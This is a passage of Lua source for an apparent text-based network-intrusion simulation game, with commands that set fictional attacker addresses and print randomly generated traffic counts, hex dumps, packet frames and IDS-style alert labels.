        elseif words[2]=="ATTNETIP4" or words[2]=="attnetip4" then
         if tonumber(words[3])~=nil and tonumber(words[4])~=nil and tonumber(words[5])~=nil and tonumber(words[6])==0 and words[7]==nil then
         attnetip13=words[3]
       attnetip14=words[4]
       attnetip15=words[5]
       attnetip16=words[6]
       
        if (attnetip13==attnetip1 and attnetip14==attnetip2 and attnetip15==attnetip3 and attnetip16==attnetip4) or (attnetip13==attnetip9 and attnetip14==attnetip10 and attnetip15==attnetip11 and attnetip16==attnetip12) or (attnetip5==attnetip13 and attnetip6==attnetip14 and attnetip7==attnetip15 and attnetip8==attnetip16) or (attnetip13==attnetip17 and attnetip14==attnetip18 and attnetip15==attnetip19 and attnetip16==attnetip20) then
        io.write("You have already set this IP address on an existing network")
         else
             io.write(words[3] .. "." .. words[4] ..  "." .. words[5] .. "." .. words[6] .. " has been set as the address of an attacker's network") 
      paxname = paxname + 10
       end
       
       
          else
                io.write("Not valid network address")
               end
          
        
        elseif words[2]=="ATTNETIP5" or words[2]=="attnetip5" then
         if tonumber(words[3])~=nil and tonumber(words[4])~=nil and tonumber(words[5])~=nil and tonumber(words[6])==0 and words[7]==nil then
         attnetip17=words[3]
       attnetip18=words[4]
       attnetip19=words[5]
       attnetip20=words[6]
       
        if (attnetip17==attnetip1 and attnetip18==attnetip2 and attnetip19==attnetip3 and attnetip20==attnetip4) or (attnetip17==attnetip9 and attnetip18==attnetip10 and attnetip19==attnetip11 and attnetip20==attnetip12) or (attnetip17==attnetip13 and attnetip18==attnetip14 and attnetip19==attnetip15 and attnetip20==attnetip16) or (attnetip5==attnetip17 and attnetip6==attnetip18 and attnetip7==attnetip19 and attnetip8==attnetip20) then
        io.write("You have already set this IP address on an existing network")
         else
             io.write(words[3] .. "." .. words[4] ..  "." .. words[5] .. "." .. words[6] .. " has been set as the address of an attacker's network") 
      paxname = paxname + 10
       
       end
       
          else
                io.write("Not valid network address")
               end
          

       
       elseif words[2]=="ATTHOSTIP1" or words[2]=="atthostip1" then
         if tonumber(words[3])~=nil and tonumber(words[4])~=nil and tonumber(words[5])~=nil and tonumber(words[6])~=nil and tonumber(words[6])~=0 and words[7]==nil then
         atthostip1=words[3]
       atthostip2=words[4]
       atthostip3=words[5]
       atthostip4=words[6]
             io.write(words[3] .. "." .. words[4] ..  "." .. words[5] .. "." .. words[6] .. " has been set as the address of an attack host") 
       paxname = paxname + 10
          else
                io.write("Wrong parameters were entered")
               end
          
        
        elseif words[2]=="ATTHOSTIP2" or words[2]=="atthostip2" then
         if tonumber(words[3])~=nil and tonumber(words[4])~=nil and tonumber(words[5])~=nil and tonumber(words[6])~=nil and tonumber(words[6])~=0 and words[7]==nil then
         atthostip5=words[3]
       atthostip6=words[4]
       atthostip7=words[5]
       atthostip8=words[6]
             io.write(words[3] .. "." .. words[4] ..  "." .. words[5] .. "." .. words[6] .. " has been set as the address of an attack host") 
       paxname = paxname + 10
           else
                io.write("Wrong parameters were entered")
               end
          
        
        elseif words[2]=="ATTHOSTIP3" or words[2]=="atthostip3" then
         if tonumber(words[3])~=nil and tonumber(words[4])~=nil and tonumber(words[5])~=nil and tonumber(words[6])~=nil and tonumber(words[6])~=0 and words[7]==nil then
         atthostip9=words[3]
       atthostip10=words[4]
       atthostip11=words[5]
       atthostip12=words[6]
             io.write(words[3] .. "." .. words[4] ..  "." .. words[5] .. "." .. words[6] .. " has been as the address of an attack host") 
       paxname = paxname + 10
           else
                io.write("Wrong parameters were entered")
               end
          
        
        elseif words[2]=="ATTHOSTIP4" or words[2]=="atthostip4" then
         if tonumber(words[3])~=nil and tonumber(words[4])~=nil and tonumber(words[5])~=nil and tonumber(words[6])~=nil and tonumber(words[6])~=0 and words[7]==nil then
         atthostip13=words[3]
       atthostip14=words[4]
       atthostip15=words[5]
       atthostip16=words[6]
             io.write(words[3] .. "." .. words[4] ..  "." .. words[5] .. "." .. words[6] .. " has been set as the address of an attack host") 
       paxname = paxname + 10
           else
                io.write("Wrong parameters were entered")
               end
          
        
        elseif words[2]=="ATTHOSTIP5" or words[2]=="atthostip5" then
        if tonumber(words[3])~=nil and tonumber(words[4])~=nil and tonumber(words[5])~=nil and tonumber(words[6])~=nil and tonumber(words[6])~=0 and words[7]==nil then
        atthostip17=words[3]
       atthostip18=words[4]
       atthostip19=words[5]
       atthostip20=words[6]
             io.write(words[3] .. "." .. words[4] ..  "." .. words[5] .. "." .. words[6] .. " has been set as the address of an attack host") 
       paxname = paxname + 10
           else
                io.write("Wrong parameters were entered")
               end
          
        
        elseif words[2]=="ATTHOSTIP6" or words[2]=="atthostip6" then
         if tonumber(words[3])~=nil and tonumber(words[4])~=nil and tonumber(words[5])~=nil and tonumber(words[6])~=nil and tonumber(words[6])~=0 and words[7]==nil then
         atthostip21=words[3]
       atthostip122=words[4]
       atthostip123=words[5]
       atthostip24=words[6]
             io.write(words[3] .. "." .. words[4] ..  "." .. words[5] .. "." .. words[6] .. " has been set as the address of an attack host") 
       paxname = paxname + 10
           else
                io.write("Wrong parameters were entered")
               end
          
          else
            io.write("Not a valid parameter entered")
          
        end  
     
     
elseif words[1]=="INFO" or words[1]=="info" then         
   if words[2] then
     io.write("No parameters should be entered")
   else
   
    CC = z+m+e+b+c+d+f+a+masq+hij+pk+jk+psm+xpath
    cg = yp + gen + geno + tz
    cmal = ym + genmal + tb 
    
      if CC > 1 then
                        io.write("Total Detectable traffic: " .. cg+cmal .. " packet transfers\n") 
                          io.write("Normal traffic: " .. yp + gen + geno .. " captures\n")
                        
                         io.write("Malicious traffic: " .. cmal .. " malicious packets\n") 
                       io.write("Number of attacks: " .. CC .. " attacks") 
      elseif CC == 1 then
                        io.write("Total Detectable traffic: " .. cg+cmal .. " packet transfers\n") 
                         io.write("Normal traffic: " .. yp + gen + geno .. " captures\n")
                         io.write("Malicious traffic: " .. cmal .. " malicious packets\n") 
                       io.write("Number of attacks: " .. CC .. " attack")                  
                       
      elseif cg >= 1 then
                      io.write("Total Detectable traffic: " .. cg+cmal .. " packet transfers\n") 
                       io.write("Normal traffic: " .. yp + gen + geno .. " captures\n")
                      io.write("Malicious traffic: " .. cmal .. " malicious packets\n") 
                        io.write("Number of attacks: " .. CC .. " attacks") 
                        
                         
    elseif cmal >= 1       then            
                        io.write("Total Detectable traffic: " .. cg+cmal .. " packet transfers\n") 
                         io.write("Normal traffic: " .. yp + gen + geno .. " captures\n")
                        io.write("Malicious traffic: " .. cmal .. " malicious packets\n") 
                         io.write("Number of attacks: " .. CC .. " attacks") 
                         
      else 
                io.write("Total Detectable traffic: " .. cg+cmal .. " packet transfers\n") 
                 io.write("Normal traffic: " .. yp + gen + geno .. " captures\n")
                io.write("Malicious traffic: " .. cmal .. " malicious packets\n") 
                    io.write("Number of attacks: " .. CC .. " attacks") 
      end
              
end
   elseif words[1]=="ANONYMIZE" or words[1]=="anonymize" then  
if words[2] then
 io.write("No parameters should be entered")
else

if paxname >= 10 then


  anon1 = math.random(0,255)
 anon2 = math.random(0,255)
 anon3 = math.random(0,255)
 anon4 = math.random(0,255)
  anonport = math.random(1,50009)

 

 
    io.write("You are now using a proxy and your new IP address is " ..  anon1 .. "." .. anon2 .. "." .. anon3 .. "." .. anon4)
anon = anon + 1

table.insert(anons,anon,anon1 .. "." .. anon2 .. "." .. anon3 .. "." .. anon4 .. ":" .. anonport)



 
 
 else
  io.write("No attacker's host has been set")
end

end

elseif words[1]=="VISUALIZE" or words[1]=="visualize" then         
      
         CC = z+m+e+b+c+d+f+a+masq+hij+pk+jk+psm+xpath
    cg = yp + gen + geno + genmal + tz
    cmal = ym + genmal + tb
    
    if (CC >= 1 or cg >=1 or cmal >=1) and transdata>=20 and transdatab>=50 and transdatax>=500 then
      if cg >= 1 and (CC>1 or cmal>1) then
ARXEIOVIZ= math.random(134678342,934634882)
    
              

                   for cgg=0 , cg+cmal-1 do
                   uinx8 = myTableZERO[ math.random( #myTableZERO ) ] 
uinx = myTableZERO[ math.random( #myTableZERO ) ] 
uin2x = myTableZERO[ math.random( #myTableZERO ) ] 
uin3x = myTableZERO[ math.random( #myTableZERO ) ] 
uinx1x = myTableZERO[ math.random( #myTableZERO ) ] 
uinx2x = myTableZERO[ math.random( #myTableZERO ) ] 
uinx3x = myTableZERO[ math.random( #myTableZERO ) ] 
uinx4x = myTableZERO[ math.random( #myTableZERO ) ] 
uinx5x = myTableZERO[ math.random( #myTableZERO ) ] 
uinx6x = myTableZERO[ math.random( #myTableZERO ) ] 
uinx7x = myTableZERO[ math.random( #myTableZERO ) ] 
uinx8x = myTableZERO[ math.random( #myTableZERO ) ] 
uinx9x = myTableZERO[ math.random( #myTableZERO ) ] 
uinx10x = myTableZERO[ math.random( #myTableZERO ) ] 
uinx11x = myTableZERO[ math.random( #myTableZERO ) ] 
uinx12x = myTableZERO[ math.random( #myTableZERO ) ] 
uinxx = myTableZERO[ math.random( #myTableZERO ) ] 
uin2xx = myTableZERO[ math.random( #myTableZERO ) ] 
uin3xx = myTableZERO[ math.random( #myTableZERO) ] 
uinx1xx = myTableZERO[ math.random( #myTableZERO ) ] 
uinx2xx = myTableZERO[ math.random( #myTableZERO ) ] 
uinx3xx = myTableZERO[ math.random( #myTableZERO ) ] 
uinx4xx = myTableZERO[ math.random( #myTableZERO ) ] 
uinx5xx = myTableZERO[ math.random( #myTableZERO ) ] 
uinx6xx = myTableZERO[ math.random( #myTableZERO ) ] 
uinx7xx = myTableZERO[ math.random( #myTableZERO ) ] 
uinx8xx = myTableZERO[ math.random( #myTableZERO ) ] 
uinx9xx = myTableZERO[ math.random( #myTableZERO) ] 
uinx10xx = myTableZERO[ math.random( #myTableZERO ) ] 
uinx11xx = myTableZERO[ math.random( #myTableZERO) ] 
uinx12xx = myTableZERO[ math.random( #myTableZERO ) ] 
uinx13xx = myTableZERO[ math.random( #myTableZERO ) ] 

uinx14xx = myTableZERO[ math.random( #myTableZERO ) ] 

uinx15xx = myTableZERO[ math.random( #myTableZERO ) ] 
uinx16xx = myTableZERO[ math.random( #myTableZERO ) ] 
uinx17xx = myTableZERO[ math.random( #myTableZERO ) ] 
uinx18xx = myTableZERO[ math.random( #myTableZERO ) ] 
uinx19xx = myTableZERO[ math.random( #myTableZERO ) ] 
uinx20xx = myTableZERO[ math.random( #myTableZERO ) ] 
uinx21xx = myTableZERO[ math.random( #myTableZERO ) ] 
uinx22xx = myTableZERO[ math.random( #myTableZERO ) ] 
uinx23xx = myTableZERO[ math.random( #myTableZERO) ] 
uinx24xx = myTableZERO[ math.random( #myTableZERO) ] 
uinx25xx = myTableZERO[ math.random( #myTableZERO ) ] 
uinx26xx = myTableZERO[ math.random( #myTableZERO) ] 
uinx27xx = myTableZERO[ math.random( #myTableZERO ) ] 
uinx28xx = myTableZERO[ math.random( #myTableZERO ) ] 
uinx29xx = myTableZERO[ math.random( #myTableZERO ) ] 
uinx30xx = myTableZERO[ math.random( #myTableZERO) ] 
uinx31xx = myTableZERO[ math.random( #myTableZERO ) ] 
uinx32xx = myTableZERO[ math.random( #myTableZERO ) ] 
uinx33xx = myTableZERO[ math.random( #myTableZERO ) ] 
uinx34xx = myTableZERO[ math.random( #myTableZERO ) ] 
uinx35xx = myTableZERO[ math.random( #myTableZERO ) ]
uinx36xx = myTableZERO[ math.random( #myTableZERO ) ]
uinx37xx = myTableZERO[ math.random( #myTableZERO ) ]
uinx38xx = myTableZERO[ math.random( #myTableZERO ) ]
uinx39xx = myTableZERO[ math.random( #myTableZERO ) ]
uinx40xx = myTableZERO[ math.random( #myTableZERO ) ]
uinx41xx = myTableZERO[ math.random( #myTableZERO ) ]
uinx42xx = myTableZERO[ math.random( #myTableZERO ) ]
uinx43xx = myTableZERO[ math.random( #myTableZERO) ]
uinx44xx = myTableZERO[ math.random( #myTableZERO ) ]
uinx45xx = myTableZERO[ math.random( #myTableZERO ) ]
uinx46xx = myTableZERO[ math.random( #myTableZERO ) ]
                   if cgg>5 then
         delay_s(0)
         else
          delay_s(0.5)
         end
                   io.write("\n" .. uinx1x .. uinx2x .. uinx3x ..  uinx4x .. uinx5x ..  uinx6x ..  uinx7x ..  uinx8x .. uinx12x .. uinx9x .. uinx10x .. uinx11x .. uinx12x .. uinxx .. uinx1xx .. uinx2xx .. uinx3xx ..  uinx4xx .. uinx5xx ..  uinx6xx ..  uinx7xx ..  uinx8xx .. uinx9xx .. uinx10xx .. uinx11xx .. uinx12xx .. uinx13xx .. uinx14xx .. uinx15xx .. uinx16xx .. uinx17xx .. uinx18xx .. uinx19xx .. uinx20xx .. uinx21xx .. uinx22xx .. uinx23xx .. uinx24xx .. uinx25xx .. uinx26xx .. uinx27xx .. uinx28xx .. uinx29xx .. uinx30xx .. uinx31xx .. uinx32xx .. uinx33xx .. uinx34xx .. uinx35xx .. uinx36xx .. uinx37xx .. uinx38xx .. uinx39xx .. uinx40xx .. uinx41xx .. uinx42xx .. uinx43xx .. uinx44xx .. uinx45xx .. uinx46xx)
                   
                 
                
                     
                   end
                
                
    
    
    

else

    
                

                   for i=1 , 25 do
      
                      if i>5 then
         delay_s(0)
         else
          delay_s(0.5)
         end
                   io.write("\n-------------------------------------------")
                   if words[2] then
                  
                   end
                     
                   end
      
                
    
    end
    
    
    else
     io.write("No traffic was detected")
    end
    



elseif words[1]=="ALARMS" or words[1]=="alarms" then  
    
   numberx = math.random(0,1000)
   CC = z+m+e+b+c+d+f+a+masq+hij+pk+jk+psm+xpath
     cg = yp + gen + geno + genmal + tz
    cmal = ym + genmal + tb
    ztotal = CC + cg + cmal + dosxp
     if ztotal >= 1 then
     
     
       
  
    
  uin = math.random(0,255)
      uinx1 = math.random(0,255)
uinxc2 = math.random(0,50)
uinxc2 = math.random(0,255)
uinxc3 = math.random(0,255)
uinc2 = math.random(0,39000)
uin2cx = math.random(0,39000)

uinxc4 = math.random(0,255)
uinxc5 = math.random(0,255)
uinxc6 = math.random(0,255)
uinxc7 = math.random(0,255)
uinportc = math.random(0,9000)
uinxc8 = myTablecc[ math.random( #myTablecc ) ] 
uinservicec = myTablec2[ math.random( #myTablec2 ) ] 
      uinx9 = math.random(0,99255)
    uinxc10 = math.random(0,99255)  
          uinx11 = math.random(0,99255)  
    uinxc12 = math.random(0,99255)  
  
    uinxc15 = math.random(0,700)  

uinxc18 = math.random(0,1000) 
uinxc19 = math.random(0,1000) 
uinservice3c = myTablec3[ math.random( #myTablec3 ) ] 
uinservice4c = myTablec4[ math.random( #myTablec4 ) ] 
uinservice5c = myTablec5[ math.random( #myTablec5 ) ] 
uinservice6c = myTablec6[ math.random( #myTablec6 ) ] 
referencec = myTablec7[ math.random( #myTablec7 ) ] 
uinservice55c = myTablec55[ math.random( #myTablec55 ) ] 

metadatac = myTablec8[ math.random( #myTablec8 ) ] 
classtypec = myTablec9[ math.random( #myTablec9 ) ] 


sidc = math.random(0,1000) 
gidc = math.random(0,2000000) 
revc = math.random(0,100) 
uinxc23 = math.random(0,1000)
priorityc = math.random(0,20) 
      
      if z > 0 then
         for i=1, z do
               uinxc13 = math.random(0,99255)  
    uinxc14 = math.random(0,700)  
          if i==1 then
      print("[**] [1:" .. uinxc13 .. ":" .. uinxc14 .. "] " .. dosrand .. " [**]")
          end
          if i==2 then
      print("[**] [1:" .. uinxc13 .. ":" .. uinxc14 .. "] " .. dosrand2 .. " [**]")
          end
          if i==3 then
      print("[**] [1:" .. uinxc13 .. ":" .. uinxc14 .. "] " .. dosrand3 .. " [**]")
          end
          if i==4 then
      print("[**] [1:" .. uinxc13 .. ":" .. uinxc14 .. "] " .. dosrand4 .. " [**]")
          end
          if i==5 then
      print("[**] [1:" .. uinxc13 .. ":" .. uinxc14 .. "] " .. dosrand5 .. " [**]")
          end
          if i>5 then
             print("[**] [1:" .. uinxc13 .. ":" .. uinxc14 .. "] DOS ATTACK attempted [**]")

          end
          
        end
      end
      if dosxp > 0 then
        uinxc13 = math.random(0,99255)  
    uinxc14 = math.random(0,700)  
         for i=1, dosxp do
      print("[**] [1:" .. uinxc13 .. ":" .. uinxc14 .. "] " .. dosrand .. " [**]")
          
        end
      end
      delay_s(0.5)
            i = i + 1
            
       if b > 0 then
         for i=1, b do
            uinxc13 = math.random(0,99255)  
    uinxc14 = math.random(0,700)  
      print("[**] [1:" .. uinxc13 .. ":" .. uinxc14 .. "] Remote File Inclusion Attack Attempted [**]")
          
 
          
        end
      end
      
        if m > 0 then
         for i=1, m do
           uinxc13 = math.random(0,99255)  
    uinxc14 = math.random(0,700)  
      print("[**] [1:" .. uinxc13 .. ":" .. uinxc14 .. "] SHELLCODE Execution Attempted [**]")
          
 
          
        end
      end
      
       if a > 0 then
         for i=1, a do
          uinxc13 = math.random(0,99255)  
    uinxc14 = math.random(0,700)  
      print("[**] [1:" .. uinxc13 .. ":" .. uinxc14 .. "] REMOTE Bufferoverflow attempt [**]")
          
 
          
        end
      end
      if c > 0 then
         for i=1, c do 
          uinxc13 = math.random(0,99255)  
    uinxc14 = math.random(0,700)  
      print("[**] [1:" .. uinxc13 .. ":" .. uinxc14 .. "] SQL sp_adduser database user creation [**]")
         print("[**] [1:" .. uinxc13 .. ":" .. uinxc14 .. "] SQL Ingres Database uuid_from_char buffer overflow attempt [**]")  
 
          
        end
      end
      
       if d > 0 then
         for i=1, d do
          uinxc13 = math.random(0,99255)  
    uinxc14 = math.random(0,700)  
      print("[**] [1:" .. uinxc13 .. ":" .. uinxc14 .. "] Cross-site Request Forgery Attempted [**]")
          
 
          
        end
      end
       if e > 0 then
         for i=1, e do
          uinxc13 = math.random(0,99255)  
    uinxc14 = math.random(0,700)  
      print("[**] [1:" .. uinxc13 .. ":" .. uinxc14 .. "] Cross-site Scripting ATTACK Attempted (XSS) [**]")
          
 
          
        end
      end
      if f > 0 then
         for i=1, f do
          uinxc13 = math.random(0,99255)  
    uinxc14 = math.random(0,700)  
      print("[**] [1:" .. uinxc13 .. ":" .. uinxc14 .. "] ARP Spoofing Attack Attempted [**]")
          
 
          
        end
      end
      if jk > 0 then
         for i=1, jk do
          uinxc13 = math.random(0,99255)  
    uinxc14 = math.random(0,700)  
      print("[**] [1:" .. uinxc13 .. ":" .. uinxc14 .. "] BRUTE-FORCE Login Attempt [**]")
          
 
          
        end
      end
      
       if pk > 0 then
         for i=1, pk do
          uinxc13 = math.random(0,99255)  
    uinxc14 = math.random(0,700)  
      print("[**] [1:" .. uinxc13 .. ":" .. uinxc14 .. "] MMALWARE-BACKDOOR possible Htran setup command [**]")
          
 
          
        end
      end
      else 
        io.write("No traffic was detected")
    end
         
    
  elseif words[1]=="ANALYZE" or words[1]=="analyze" then
   if words[2]=="HEX" then 
      if digdi>=1 then
        io.write("No traffic was detected")
      else
        CC = z+m+e+b+c+d+f+a+masq+hij+pk+jk+psm+xpath
     cg = yp + gen + geno + genmal + tz
    cmal = ym + genmal + tb
     hexz = 0000
      if CC >= 1 or cg >= 1 or cmal >=1 then
          local hex = { 'a', 'b', 'd', 'c', 'e','f','1','2','3','4','5','6','7','8','9','0'}
         
          hexxxx = CC + cg + cmal
     for plpl = 0, (hexxxx-1) do
            hexnum = math.random(4,56)
            hexz = 0
             if plpl>7 then
         delay_s(0)
         else
          delay_s(0.5)
         end
          for i = 0, hexnum do
          hex1 = hex[ math.random( #hex ) ] 
          hex2 = hex[ math.random( #hex ) ] 
          hex3 = hex[ math.random( #hex ) ] 
          hex4 = hex[ math.random( #hex ) ] 
          hex5 = hex[ math.random( #hex ) ] 
          hex6 = hex[ math.random( #hex ) ] 
          hex7 = hex[ math.random( #hex ) ] 
          hex8 = hex[ math.random( #hex ) ] 
          hex9 = hex[ math.random( #hex ) ] 
          hex10 = hex[ math.random( #hex ) ] 
          hex11 = hex[ math.random( #hex ) ] 
          hex12 = hex[ math.random( #hex ) ] 
          hex13 = hex[ math.random( #hex ) ] 
          hex14 = hex[ math.random( #hex ) ] 
          hex15 = hex[ math.random( #hex ) ]
          hex16 = hex[ math.random( #hex ) ]
          hex17 = hex[ math.random( #hex ) ] 
          hex18 = hex[ math.random( #hex ) ] 
          hex19 = hex[ math.random( #hex ) ] 
          hex20 = hex[ math.random( #hex ) ] 
          hex21 = hex[ math.random( #hex ) ] 
          hex22 = hex[ math.random( #hex ) ] 
          hex23 = hex[ math.random( #hex ) ] 
          hex24 = hex[ math.random( #hex ) ] 
          hex25 = hex[ math.random( #hex ) ] 
          hex26 = hex[ math.random( #hex ) ] 
          hex27 = hex[ math.random( #hex ) ] 
          hex28 = hex[ math.random( #hex ) ] 
          hex29 = hex[ math.random( #hex ) ] 
          hex30 = hex[ math.random( #hex ) ] 
          hex31 = hex[ math.random( #hex ) ]
          hex32 = hex[ math.random( #hex ) ]
          
hex33 = myTablex[ math.random( #myTablex ) ] 
hex34 = myTablex[ math.random( #myTablex ) ]
hex35 = myTablex[ math.random( #myTablex ) ] 
hex36 = myTablex[ math.random( #myTablex ) ] 
hex37 = myTablex[ math.random( #myTablex ) ] 
hex38 = myTablex[ math.random( #myTablex ) ] 
hex39 = myTablex[ math.random( #myTablex ) ] 
hex40 = myTablex[ math.random( #myTablex ) ] 
hex41 = myTablex[ math.random( #myTablex ) ] 
hex42 = myTablex[ math.random( #myTablex ) ] 
hex43 = myTablex[ math.random( #myTablex ) ] 
hex44 = myTablex[ math.random( #myTablex ) ] 
hex45 = myTablex[ math.random( #myTablex ) ] 
hex46 = myTablex[ math.random( #myTablex ) ] 
hex47 = myTablex[ math.random( #myTablex ) ] 
hex48 = myTablex[ math.random( #myTablex ) ] 


uinx14xx = myTablex[ math.random( #myTablex ) ] 

uinx15xx = myTablex[ math.random( #myTablex ) ] 
uinx16xx = myTablex[ math.random( #myTablex ) ]
        
       
        
        
        if i < 9  then
           
          hexz = hexz + 10
          hexin = '00'
        else
           hexz = hexz + 10
          hexin = '0'
        end
          
          
         io.write(hexin .. hexz .. " " .. hex1 .. hex17 .. " " .. hex2 .. hex18 .. " " .. hex3 .. hex19 .. " " .. hex4 .. hex20 .. " " .. hex5 .. hex21 .. " " .. hex6 .. hex22 .. " " .. hex7 .. hex23 .. " " .. hex8 .. hex24 .."  " .. hex9 .. hex25 .. " " .. hex10 .. hex26 .. " " .. hex11 .. hex27 .. " " .. hex12 .. hex28 .. " " .. hex13 .. hex29 .. " " .. hex14 .. hex30 .. " " .. hex15 .. hex31 .. " " .. hex16 .. hex32 .. "  " .. hex33 .. hex34 .. hex35 .. hex36 .. hex37 .. hex38 .. hex39 .. hex40 .. " " .. hex41 .. hex42 .. hex43 .. hex44 .. hex45 .. hex46 .. hex47 .. hex48 .. "\n")
         end
         plpl = plpl + 1
         io.write("\n")
      end
      else
           io.write("No traffic was detected")
      end
     end
   end
    if words[2]=="FRAMES" then
      if digdi>=1 then
        io.write("No traffic was detected")
      else
       
        CC = z+m+e+b+c+d+f+a+masq+hij+pk+jk+psm+xpath
     cg = yp + gen + geno + genmal + tz
    cmal = ym + genmal + tb
    ztotal = CC + cg + cmal
    franum = 0
     if ztotal >=1 then 
         local text = { 'a', 'b', 'd', 'g', 'h', 'e', 'f', 'h', 'i', 'j', 's','k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u','v','e','w','x','y','z','1','2','3','4','5','6','7','8','9','0'}
         local routers = {'USRoboti','HOL','OteRouter','Forthnet', 'Apple'}
                  local portser = {'dns (53)','db-lsp-disc (17500)','ntp (123)','mdns (5353)'}
local porttcp = {'http (80)','49621 (49621)','ntp (123)','49689 (49689)','https (443)'}
                  local PC = {'Apple','HP','Dell','Sony','Intel','IBM'}
                   local proto = {'Address Resolution Protocol (reply)', 'Address Resolution Protocol (request)','Domain Name System (response)','Domain Name System (query)','Hypertext Transfer Protocol\nLine-based text data: text/html','Hypertext Transfer Protocol\nMedia Type','PPP-over-Ethernet Discovery','NetBIOS Name Service','Secure Sockets Layer','Internet Group Management Protocol', 'Point-to-Point Protocol','PPP Link Control Protocol','Dropbox LAN sync Discovery Protocol','Network Time Protocol','Internet Control Message Protocol','User Datagram Protocol','Remote Packet Capture','Border Gateway Protocol','H.255.0 CS','Q.931','TPKT, Version: 3, Length: 44','Open Shortest Path First','Generic Routing Encapsulation (IP)','Cisco Discovery Protocol','Link Layer Discovery Protocoll','Spanning Tree Protocol','Bootstrap Protocol','Web Cache Communication Protocol','Network Time Protocol'}


        for i=0 , (ztotal-1) do
        
        
        rouid1 = text[ math.random( #text ) ] 
        rouid2 = text[ math.random( #text ) ] 
        rouid3 = text[ math.random( #text ) ] 
        rouid4 = text[ math.random( #text ) ] 
        rouid5 = text[ math.random( #text ) ] 
        rouid6 = text[ math.random( #text ) ] 
        rouid7 = text[ math.random( #text ) ] 
        rouid8 = text[ math.random( #text ) ] 
        rouid9 = text[ math.random( #text ) ] 
        rouid10 = text[ math.random( #text ) ] 
        rouid11 = text[ math.random( #text ) ] 
        rouid12 = text[ math.random( #text ) ] 
        rouid13 = text[ math.random( #text ) ] 
        rouid14 = text[ math.random( #text ) ] 
        rouid15 = text[ math.random( #text ) ] 
        rouid16 = text[ math.random( #text ) ] 
        rouid17 = text[ math.random( #text ) ] 
        rouid18 = text[ math.random( #text ) ] 
            rouid19 = text[ math.random( #text ) ] 
        rouid20 = text[ math.random( #text ) ] 
        rouid21 = text[ math.random( #text ) ] 
        rouid22 = text[ math.random( #text ) ] 
        rouid23 = text[ math.random( #text ) ] 
        rouid24 = text[ math.random( #text ) ] 
        rouid25 = text[ math.random( #text ) ] 
        rouid26 = text[ math.random( #text ) ] 
        rouid27 = text[ math.random( #text ) ] 
        rouid28 = text[ math.random( #text ) ] 
        rouid29 = text[ math.random( #text ) ] 
        rouid30 = text[ math.random( #text ) ] 
        rouid31 = text[ math.random( #text ) ] 
        rouid32 = text[ math.random( #text ) ] 
        rouid33 = text[ math.random( #text ) ] 
        rouid34 = text[ math.random( #text ) ] 
        rouid35 = text[ math.random( #text ) ] 
        rouid36 = text[ math.random( #text ) ] 
        rouid37 = routers[ math.random( #routers ) ] 
        rouid38 = PC[ math.random( #PC ) ] 
ip1 = math.random(0,255)
ip2 = math.random(0,255)
ip3 = math.random(0,255)
ip4 = math.random(0,255)
ip5 = math.random(0,255)
ip6 = math.random(0,255)
ip7 = math.random(0,255)
ip8 = math.random(0,255)
seq = math.random(0,7550)
ack = math.random(0,7550)
len = math.random(0,255)
protora = proto[ math.random( #proto ) ] 
portra = portser[ math.random( #portser ) ] 
portx = porttcp[ math.random( #porttcp ) ] 


      franum = franum + 1
            frabytes = math.random(0,7000)
     frabits = math.random(0,5000)
           frainterface = math.random(0,3)
 
   if i>10 then
         delay_s(0)
         else
          delay_s(0.5)
         end
    io.write("-----------------------------------------------------------------------------------------------------------\n")
      io.write("Frame " .. franum .. ": " .. frabytes .. " bytes on wire (" .. frabits .. " bits), " .. frabytes .. " bytes captured (" .. frabits .. " bits) on wire interface " .. frainterface .. "\n")
       io.write("Ethernet II, Src: " .. rouid37 .. "_" .. rouid1 .. rouid4 .. ":" .. rouid2 .. rouid5 .. ":" .. rouid3 .. rouid6 .. " (" .. rouid7 .. rouid8 .. ":" .. rouid9 .. rouid10 .. ":" .. rouid11 .. rouid12 .. ":" .. rouid13 .. rouid14 .. ":" .. rouid15 .. rouid16 .. ":" .. rouid17 .. rouid18 .. ", Dst: " .. rouid38 .. "_" .. rouid19 .. rouid20 .. ":" .. rouid21 .. rouid22 .. ":" .. rouid23 .. rouid24 .. " (" .. rouid25 .. rouid26 .. ":" .. rouid27 .. rouid28 .. ":" .. rouid29 .. rouid30 .. ":" .. rouid31 .. rouid32 .. ":" .. rouid33 .. rouid34 .. ":" .. rouid35 .. rouid36 .. "\n")
       
       
       io.write("Internet Protocol Version 4, Src: " .. ip1 .. "." .. ip2 .. "." .. ip3 .. "." .. ip4 .. " (" .. ip1 .. "." .. ip2 .. "." .. ip3 .. "." .. ip4 .. "), Dst: " .. ip5 .. "." .. ip6 .. "." .. ip7 .. "." .. ip8 .. " (" .. ip5 .. "." .. ip6 .. "." .. ip7 .. "." .. ip8 .. ")" .. "\n")
       
       
       if protora == 'Domain Name System (response)' or protora == 'Domain Name System (query)' or protora == 'Dropbox LAN sync Discovery Protocol'  then
        io.write("User Datagram Protocol, Src Port: " .. portra .. ", Dst Port: " .. portra .. "\n")
        else 
        io.write("Transmission Control Protocol, Src Port: " .. portx .. ", Dst Port: " .. portx .. ", Seq: " .. seq .. ", Ack: " .. ack .. ", " .. "Len: " .. len .. "\n")

       end
       
       io.write(protora .. "\n")
       
       
       
       
      delay_s(0)
      
      io.write("-----------------------------------------------------------------------------------------------------------\n")
    
      end
    end
      end
    end


elseif words[1]=="ATTRIBUTES" or words[1]=="attributes" then  
     
       
      
           io.write("@duration")
         
      
           io.write("\n@protocoltype")
      
      
           io.write("\n@service")
        
      
           io.write("\n@flag")
       
      
           io.write("\n@src_bytes")
        
      
           io.write("\n@dst_bytes")
       
      
           io.write("\n@land")
       
      
           io.write("\n@wrong_fragment")
        
      
           io.write("\n@urgent")
        
      
           io.write("\n@hot")
         
      
           io.write("\n@num_failed_logins")
        
      
           io.write("\n@logged_in")
        
      
           io.write("\n@num_compromised")
       
      
           io.write("\n@root_shell")
           io.write("\n@su_attempted")
           io.write("\n@num_root")
           io.write("\n@num_file_creations")
           io.write("\n@num_shells")
           io.write("\n@num_access_files")
           io.write("\n@num_outbound_cmds")
           io.write("\n@is_host_login")
           io.write("\n@is_guest_login")
           io.write("\n@count")
           io.write("\n@srv_count")
           io.write("\n@serror_rate")
           
           io.write("\n@srv_serror_rate")
           io.write("\n@rerror_rate")
           io.write("\n@srv_rerror_rate")
           io.write("\n@src_port")
           io.write("\n@dst_port")
           io.write("\n@xssdetect")
           io.write("\n@average_rtt")
           io.write("\n@iplen")
           io.write("\n@ethlen")
           io.write("\n@stan_dev_rtt")
